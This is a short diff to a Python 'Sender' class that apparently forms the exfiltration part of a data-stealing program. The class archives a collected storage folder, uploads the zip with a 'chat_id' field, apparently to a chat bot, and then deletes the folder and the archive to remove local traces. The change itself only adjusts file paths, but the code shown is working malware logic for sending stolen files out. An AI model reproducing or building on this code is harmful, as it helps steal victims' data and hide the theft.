@@ -1,4 +1,4 @@
-from os import remove
+from os import remove, path
 from shutil import make_archive, rmtree
 from urllib.request import Request, urlopen
 
@@ -17,11 +17,11 @@ class Sender:
 
     def __create_archive(self):
 
-        make_archive(rf"{self.storage_path}\{self.zip_name}", "zip", rf"{self.storage_path}\{self.storage_folder}")
+        make_archive(rf"{path.dirname(self.storage_path)}\{self.zip_name}", "zip", self.storage_path)
 
     def __send_archive(self):
 
-        with open(rf"{self.storage_path}\{self.zip_name}.zip", "rb") as file:
+        with open(rf"{path.dirname(self.storage_path)}\{self.zip_name}.zip", "rb") as file:
 
             content_type, body = MultipartFormDataEncoder().encode(
                 [("chat_id", self.user_id)],
@@ -43,8 +43,8 @@ class Sender:
 
     def __delete_files(self):
 
-        rmtree(rf"{self.storage_path}\{self.storage_folder}")
-        remove(rf"{self.storage_path}\{self.zip_name}.zip")
+        rmtree(self.storage_path)
+        remove(rf"{path.dirname(self.storage_path)}\{self.zip_name}.zip")
 
     def run(self):
 
